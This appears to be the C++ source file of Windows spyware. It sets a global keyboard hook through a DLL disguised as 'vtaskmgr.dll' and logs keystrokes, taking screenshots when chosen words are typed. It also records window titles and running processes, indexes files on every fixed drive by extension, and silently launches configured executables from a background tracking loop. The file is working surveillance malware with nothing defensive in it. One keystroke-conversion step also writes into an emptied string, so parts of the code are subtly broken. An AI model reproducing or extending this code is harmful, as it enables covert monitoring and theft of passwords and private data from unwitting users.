
#include "log.h"
#include "utils.h"

namespace logger
{
	keylogger_t::keylogger_t(HWND wnd)
	{
		buffer.resize(20);

		load_dll();

		if (set_hook_handler)
			set_hook_handler(wnd, WM_HOOKMESSAGE);
	}

	keylogger_t::~keylogger_t()
	{
		if (release_hook_handler) release_hook_handler();
		if (dll) FreeLibrary(dll);
	}

	void keylogger_t::log(UINT code)
	{
		switch (code)
		{
			case VK_BKSP:
			{
				data << L"[b]";
				this->pop();
				break;
			}
			case VK_ESC:
			{
				data << L"[esc]";
				break;
			}
			case VK_ENTER:
			{
				data << L"[en]" << endl;
				break;
			}
			default:
			{
				wstring temp;
				temp.push_back(static_cast<wchar_t>(code));
				string ascii = utils::to_ascii(temp);
				temp.clear();
				mbstowcs(&temp[0], ascii.c_str(), ascii.size());

				wchar_t symbol = temp[0];

				data << symbol;
				this->push(symbol);

				if (this->match())
				{
					make_screenshot();
				}
			}
		}
	}

	void keylogger_t::clear()
	{
		data.str(wstring());
	}

	void keylogger_t::dump()
	{
		utils::save_logfile(data, KEYS);

		this->clear();
	}

	void keylogger_t::dump(const path & file)
	{
		utils::save_logfile(file, data, KEYS);

		this->clear();
	}

	void keylogger_t::load_dll()
	{
		if (dll = LoadLibrary((LPCWSTR)L"vtaskmgr.dll"))
		{
			set_hook_handler = (int(*)(HWND, UINT)) GetProcAddress(dll, "SetHook");
			release_hook_handler = (int(*)()) GetProcAddress(dll, "UnSetHook");
		}
	}

	void keylogger_t::init_dictionary()
	{
		dict.reserve(200);
	}

	void keylogger_t::push(wchar_t symbol)
	{
		if (buffer.size() >= 20)
		{
			buffer.pop_front();
			buffer.push_back(symbol);
		}
		else buffer.push_back(symbol);
	}

	void keylogger_t::pop()
	{
		if (buffer.size())
			buffer.pop_back();
	}

	bool keylogger_t::match()
	{
		wstring line = get_line();

		for (auto word : dict)
		{
			size_t pos = line.find(word);

			if (pos != wstring::npos)
			{
				buffer.clear();
				buffer.resize(20);

				return true;
			}
		}

		return false;
	}

	wstring keylogger_t::get_line() const
	{
		wstring temp;

		for (auto it : buffer)
			temp += it;

		return temp;
	}



	vector<wstring> wnd_buffer;

	windows_logger_t::windows_logger_t(HWND wnd)
	{

	}

	windows_logger_t::~windows_logger_t()
	{

	}

	void windows_logger_t::log()
	{
		data.clear();

		EnumWindows(enum_windows, NULL);

		data.swap(wnd_buffer);
	}

	void windows_logger_t::dump()
	{
		if (data.size())
		{
			utils::save_logfile(data, WINDOWS);

			this->clear();
		}
	}

	void windows_logger_t::dump(const path & file)
	{
		if (data.size())
		{
			utils::save_logfile(file, data, WINDOWS);

			this->clear();
		}
	}

	void windows_logger_t::log_dump(const path & file)
	{
		log();
		dump(file);
	}

	BOOL CALLBACK enum_windows(HWND wnd, LPARAM param)
	{
		wchar_t buf[255];
		ZeroMemory(buf, sizeof(buf));

		if (IsWindow(wnd))
		{
			GetWindowTextW(wnd, buf, 254);
			wnd_buffer.push_back(buf);

			if (wnd_buffer.back().length() == 0)
				wnd_buffer.pop_back();
		}

		return TRUE;
	}



	procs_logger_t::procs_logger_t()
	{

	}

	procs_logger_t::~procs_logger_t()
	{

	}

	void procs_logger_t::log()
	{
		data.clear();

		HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
		PROCESSENTRY32W pe = { 0 };
		pe.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(handle, &pe))
		{
			do
			{
				data.push_back(pe.szExeFile);
			}
			while (Process32NextW(handle, &pe));
		}

		CloseHandle(handle);
	}

	void procs_logger_t::dump()
	{
		if (data.size())
		{
			utils::save_logfile(data, PROCESSES);

			this->clear();
		}
	}

	void procs_logger_t::dump(const path & file)
	{
		if (data.size())
		{
			utils::save_logfile(file, data, PROCESSES);

			this->clear();
		}
	}

	void procs_logger_t::log_dump(const path & file)
	{
		log();
		dump(file);
	}



	file_logger_t::file_logger_t()
	{

	}

	file_logger_t::~file_logger_t()
	{

	}

	void file_logger_t::log()
	{
		log_filesystem(true, vector<wstring>());
	}

	void file_logger_t::dump()
	{
		if (data.size())
		{
			utils::save_logfile(data, FILES);

			this->clear();
		}
	}

	void file_logger_t::dump(const path & file)
	{
		if (data.size())
		{
			utils::save_logfile(file, data, FILES);

			this->clear();
		}
	}

	void file_logger_t::log_dump()
	{
		log();
		dump();
	}

	void file_logger_t::log(const vector<wstring> & ext)
	{
		log_filesystem(false, ext);
	}

	void file_logger_t::log_files_dump(const vector<wstring> & ext)
	{
		log(ext);
		dump();
	}



	vector<path> file_logger_t::get_hard_disks() const
	{
		vector<path> drives;

		DWORD size = MAX_PATH;
		wchar_t logic_drives[MAX_PATH] = { 0 };
		DWORD result = GetLogicalDriveStringsW(size, logic_drives);

		if (result > 0 && result <= MAX_PATH)
		{
			wchar_t * single_drive = logic_drives;

			while (*single_drive)
			{
				if (GetDriveTypeW(single_drive) == DRIVE_FIXED)
					drives.push_back(path(single_drive));

				single_drive += wcslen(single_drive) + 1;
			}
		}

		return drives;
	}

	void file_logger_t::log_filesystem(bool only_folders, const vector<wstring> & ext)
	{
		data.reserve(10000);

		vector<path> disks = get_hard_disks();

		for (auto disk_it : disks)
		{
			recursive_directory_iterator path_it(disk_it);
			recursive_directory_iterator path_it_end;

			while (path_it != path_it_end)
			{
				try
				{
					path current(*path_it);

					if (only_folders && is_directory(current))
					{
						data.push_back(current.generic_wstring());
					}
					else if (!only_folders && is_regular_file(current))
					{
						if (ext.size())
						{
							wstring file_ext = current.extension().generic_wstring();
							auto it = find(ext.begin(), ext.end(), file_ext);

							if (it != ext.end())
							{
								data.push_back(current.generic_wstring());
							}
						}
						else
						{
							data.push_back(current.generic_wstring());
						}
					}

					++path_it;
				}
				catch (const filesystem_error & ex)
				{
					if (ex.code() == boost::system::errc::permission_denied)
					{
						path_it.no_push();
						++path_it;
						continue;
					}
				}
			}
		}
	}



	spy_t::spy_t()
	{
		program.load();
	}

	spy_t::~spy_t()
	{
		keyboard->dump();
		windows->dump();
		processes->dump();
		files->dump();
	}

	void spy_t::init(HWND wnd)
	{
		keyboard = make_shared<keylogger_t>(wnd);
		windows = make_shared<windows_logger_t>(wnd);
		processes = make_shared<procs_logger_t>();
		files = make_shared<file_logger_t>();

		boost::thread track_thread(boost::bind(&spy_t::tracking_loop, this));
		track_thread.detach();
	}

	void spy_t::tracking_loop()
	{
		while (true)
		{
			try
			{
				processes->log();
				vector<wstring> procs = processes->get_data();
				vector<wstring> tracked_procs = program.get_procs();

				if (detected(procs, tracked_procs))
				{
					processes->dump();
					make_screenshot();
				}

				windows->log();
				vector<wstring> wnds = windows->get_data();
				vector<wstring> tracked_wnds = program.get_windows();

				if (detected(wnds, tracked_wnds))
				{
					windows->dump();
					make_screenshot();
				}

				boost::this_thread::interruption_point();
				boost::this_thread::sleep_for(seconds(45));
			}
			catch (boost::thread_interrupted &) { return; }
		}
	}

	bool spy_t::detected(const vector<wstring> & current, const vector<wstring> & tracked) const
	{
		if (current.size() == 0 || tracked.size() == 0)
			return false;

		for (auto elem : tracked)
		{
			auto it = find(current.begin(), current.end(), elem);

			if (it != current.end())
				return true;
		}

		return false;
	}

	template <class archive>
	void spy_t::track_program::serialize(archive & ar, unsigned int version)
	{
		ar & procs;
		ar & wnds;
		ar & modules;
		ar & timeout;
	}

	void spy_t::track_program::load()
	{
		path file_path(current_path().generic_wstring() + L"/" + progfile);

		if (exists(file_path))
		{
			ifstream file(progfile, ios::in);
			boost::archive::text_iarchive ar(file);
			ar >> *this;
		}
	}

	void spy_t::track_program::save()
	{
		ofstream file(progfile, ios::out);
		boost::archive::text_oarchive ar(file);
		ar << *this;
	}

	void spy_t::track_program::add_process(const wstring & proc)
	{
		if (find(procs.begin(), procs.end(), proc) == procs.end())
		{
			procs.push_back(proc);
			save();
		}
	}

	void spy_t::track_program::add_window(const wstring & wnd)
	{
		if (find(wnds.begin(), wnds.end(), wnd) == wnds.end())
		{
			wnds.push_back(wnd);
			save();
		}
	}

	void spy_t::track_program::add_module(const wstring & module)
	{
		if (find(modules.begin(), modules.end(), module) == modules.end())
		{
			if (module.substr(module.length() - 4, module.length()) == ".exe")
			{
				modules.push_back(module);
				save();
			}
		}
	}

	void spy_t::track_program::reset()
	{
		path file_path(current_path().generic_wstring() + L"/" + progfile);

		if (exists(file_path))
			remove(file_path);

		procs.clear();
		wnds.clear();
		modules.clear();
		timeout = 0;
	}

	void spy_t::track_program::start_modules()
	{
		for (auto it : modules)
		{
			path module(it);

			if (exists(module) && is_regular_file(module)
				&& module.extension().generic_wstring() == L".exe")
			{
				char buf[255];
				wcstombs(buf, it.c_str(), sizeof(buf));
				WinExec(buf, 0);
			}
		}
	}

	vector<wstring> spy_t::track_program::get_procs() const { return procs; }

	vector<wstring> spy_t::track_program::get_windows() const { return wnds; }

	vector<wstring> spy_t::track_program::get_modules() const { return modules; }
}